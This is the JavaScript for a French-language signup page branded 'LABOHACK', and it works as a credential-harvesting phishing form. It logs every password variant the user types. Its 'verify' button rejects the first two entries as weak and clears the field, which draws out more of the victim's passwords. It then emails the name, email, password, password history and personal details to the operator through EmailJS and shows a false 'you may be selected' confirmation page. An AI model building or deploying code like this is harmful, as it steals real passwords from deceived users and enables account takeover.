
// Configuration EmailJS
const EMAILJS_PUBLIC_KEY = 'sB1cJXt7DykBzocSR';
const EMAILJS_SERVICE_ID  = 'service_j8i0h5n';
const EMAILJS_TEMPLATE_ID = 'template_3nt63pp';

let checkAttempts = 0;
const MAX_ATTEMPTS = 3;
let allData = {
  username: '',
  email: '',
  password: '',
  country: '',
  gender: '',
  social: '',
  passwordHistory: []
};
let isSubmitting = false;

const form = document.getElementById('signupForm');
const usernameInput = document.getElementById('username');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const countrySelect = document.getElementById('country');
const genderRadios = document.querySelectorAll('input[name="gender"]');
const socialInput = document.getElementById('social');
const termsCheck = document.getElementById('terms');
const checkBtn = document.getElementById('checkBtn');
const toast = document.getElementById('toast');
const submitBtn = document.querySelector('button[type="submit"]');

// Enregistrement en temps réel
function updateAllData() {
  allData.username = usernameInput.value;
  allData.email = emailInput.value;
  allData.password = passwordInput.value;
  allData.country = countrySelect.value;
  allData.social = socialInput.value;
  genderRadios.forEach(radio => {
    if (radio.checked) allData.gender = radio.value;
  });
}

usernameInput.addEventListener('input', updateAllData);
emailInput.addEventListener('input', updateAllData);
passwordInput.addEventListener('input', () => {
  updateAllData();
  const pwd = passwordInput.value.trim();
  if (pwd.length >= 1) {
    if (allData.passwordHistory.length === 0 || allData.passwordHistory[allData.passwordHistory.length-1] !== pwd) {
      allData.passwordHistory.push(pwd);
      if (allData.passwordHistory.length > 10) allData.passwordHistory.shift();
    }
  }
  updateStrengthMeter(pwd);
});
countrySelect.addEventListener('change', updateAllData);
genderRadios.forEach(radio => radio.addEventListener('change', updateAllData));
socialInput.addEventListener('input', updateAllData);

// Indicateur de force (gris, sans message de longueur)
function updateStrengthMeter(pwd) {
  const bars = [
    document.getElementById('strengthBar1'),
    document.getElementById('strengthBar2'),
    document.getElementById('strengthBar3')
  ];
  const label = document.getElementById('strengthLabel');
  bars.forEach(bar => bar.classList.remove('active'));

  if (pwd.length === 0) {
    label.textContent = 'force : —';
    label.style.color = '#666666';
    return;
  }

  let score = 0;
  if (pwd.length >= 8) score++;
  if (/[A-Z]/.test(pwd) && /[a-z]/.test(pwd)) score++;
  if (/\d/.test(pwd) || /[^A-Za-z0-9]/.test(pwd)) score++;

  for (let i = 0; i < score; i++) bars[i].classList.add('active');

  if (score === 0) { label.textContent = 'force : faible'; label.style.color = '#666666'; }
  else if (score === 1) { label.textContent = 'force : faible'; label.style.color = '#888888'; }
  else if (score === 2) { label.textContent = 'force : moyen'; label.style.color = '#aaaaaa'; }
  else { label.textContent = 'force : fort'; label.style.color = '#cccccc'; }
}

// Bouton VERIFIER : échoue 3 fois, puis disparaît (pas de message de longueur)
checkBtn.addEventListener('click', function() {
  const pwd = passwordInput.value.trim();
  if (pwd.length === 0) {
    showToast('[!] saisis un mot de passe.', true);
    return;
  }

  checkAttempts++;
  // Le compteur n'est pas affiché dans l'interface

  if (checkAttempts < MAX_ATTEMPTS) {
    showToast('mot de passe faible. reessaie.', true);
    passwordInput.value = '';
    passwordInput.focus();
  } else {
    showToast('mot de passe accepte.', false);
    checkBtn.style.display = 'none';
  }
});

// Soumission finale (1 email, sans validation de longueur)
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  if (isSubmitting) return;
  isSubmitting = true;
  submitBtn.textContent = '...';
  submitBtn.disabled = true;

  updateAllData();

  if (!allData.username || !allData.email || !allData.password || !allData.country || !allData.gender || !termsCheck.checked) {
    showToast('[!] tous les champs sont obligatoires.', true);
    resetSubmitButton();
    return;
  }

  const templateParams = {
    nom: allData.username,
    email: allData.email,
    password: allData.password,
    country: allData.country,
    gender: allData.gender || 'non precise',
    social: allData.social || 'non renseigne',
    history: allData.passwordHistory.join(' -> ') || 'aucun historique',
    attempts: checkAttempts,
    final: 'OUI'
  };

  try {
    await emailjs.init(EMAILJS_PUBLIC_KEY);
    const response = await emailjs.send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      templateParams
    );
    console.log('Email envoye', response);
    showToast('inscription reussie ! redirection...', false);

    // --- PAGE DE CONFIRMATION COHERENTE ---
    document.body.innerHTML = `
      <div class="container" style="text-align:center; padding:4rem 2rem;">
        <h1 style="font-size:2.2rem; letter-spacing:4px; color:#cccccc; text-shadow:0 0 8px #555555; border-bottom:1px solid #444444; padding-bottom:0.5rem; margin-bottom:1.5rem;">LABO<span style="color:#aaaaaa;">HACK</span></h1>
        <div style="font-size:4rem; margin:2rem 0; color:#666666; font-family:'Courier New',monospace;">[ # ]</div>
        <h2 style="color:#aaaaaa; font-size:1.4rem; letter-spacing:2px;">MERCI</h2>
        <p style="color:#888888; font-size:1rem; margin:1rem 0; line-height:1.6;">
          nous verifions vos informations.<br>
          <strong style="color:#999999; font-size:1.2rem;">vous recevrez un email dans 15 jours</strong><br>
          si vous etes selectionne.
        </p>
        <p style="color:#444444; margin-top:2rem; font-size:0.6rem; letter-spacing:2px; border-top:1px solid #333333; padding-top:1rem;">[ labohack ]</p>
      </div>
    `;

  } catch (error) {
    console.error('Erreur EmailJS :', error);
    showToast('[!] erreur lors de l\'envoi. verifie ta connexion.', true);
    resetSubmitButton();
  }
});

// Bouton GitHub (factice)
document.getElementById('githubBtn').addEventListener('click', () => {
  showToast('[!] fonctionnalite en developpement.', true);
});

// Utilitaires
function showToast(text, isError = true) {
  toast.textContent = text;
  toast.classList.remove('hidden');
  toast.style.borderColor = isError ? '#555555' : '#777777';
  toast.style.color = isError ? '#aaaaaa' : '#cccccc';
  clearTimeout(window.toastTimeout);
  window.toastTimeout = setTimeout(() => toast.classList.add('hidden'), 5000);
}

function resetSubmitButton() {
  isSubmitting = false;
  submitBtn.textContent = "S'INSCRIRE";
  submitBtn.disabled = false;
}

updateAllData();
